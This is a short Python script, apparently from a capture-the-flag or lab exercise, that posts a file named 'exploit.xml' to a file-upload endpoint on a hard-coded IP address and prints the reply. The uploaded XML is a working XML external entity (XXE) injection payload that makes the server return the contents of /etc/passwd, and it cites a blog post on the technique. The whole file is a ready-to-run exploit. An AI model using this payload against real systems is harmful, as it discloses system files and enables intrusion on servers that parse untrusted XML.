import requests

r = requests.post(
    'http://43.241.202.47:3003/file-upload',
    files={
        'file': ('exploit.xml',
                 # https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
                 '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [\n  <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">\n]><creds><user>&xxe;</user><pass>mypass</pass></creds>')
    }
)

print("Status code:", str(r.status_code) + "\n")
print(r.text)  # TODO save as .html and open Chrome?
